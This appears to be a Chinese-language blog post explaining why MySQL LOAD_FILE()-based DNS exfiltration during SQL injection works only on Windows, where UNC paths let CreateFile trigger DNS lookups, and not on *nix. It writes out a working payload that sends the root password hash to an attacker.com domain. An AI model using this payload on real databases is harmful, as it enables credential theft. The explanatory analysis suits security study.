几天前和朋友在测试一个注入，想要使用MySQL通过load_file()函数，再由DNS查询传出注入出来的数据时候遇到的问题
以下语句
    SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM mysql.user WHERE user='root' LIMIT 1),'.attacker.com\\foobar'));
只有Windows + MySQL才能成功通过DNS查询包传出我们想要的数据
而在*nix + MySQL环境下是无法成功的。
（大家可以试试）
这是为什么呢，我探究了一下背后的原理
MySQL load_file()函数相关的源码
      if ((file= mysql_file_open(key_file_loadfile,
                                 file_name->ptr(), O_RDONLY, MYF(0))) `
可以看到CreateFile()这个函数支持Universal Naming Conventions(UNC)
可以去访问远程的域名主机上的文件，在UNC中是支持域名进行远程主机访问的，既然要访问域名就必然进行DNS解析请求，从而传出数据。
文档节选：  
`host-name: The host name of a server or the domain name of a domain hosting
resource, using the syntax of IPv6address, IPv4address, and reg-name as
specified in[RFC3986]`
假设MySQL源码里面Win32下用的是C标准库函数fopen()，那么我们就无法通过DNS查询包传送出来我们的数据。（最终都是调用到了CreateFile*
感谢zcgonvh）
并且普通的*nix下是更加无法进行DNS查询，传出我们想要的数据的。
因为仅仅用了一个普通的open()函数（这个函数是在另一个头里，我也进行了追踪，但是最后发现其实也只能打开本地文件）
即使重新做了一个函数可以打开网络中的其他文件，没有类似UNC这背后的一套体系，这种注入出数据的手法也进行不下去。
很佩服第一个想到用DNS来传送SQL注入的数据的人，他肯定是看了MySQL的源码，并且对Windows的API相当熟悉的人。
Reference：  
`[]() []()`
==============勘误===============  
zcgonvh进行了调试，在Windows VC库函数中Fopen实际上最后调用的也是kernel32.dll里的CreateFile*这类Win32
API，所以必然也是支持自家的unc的。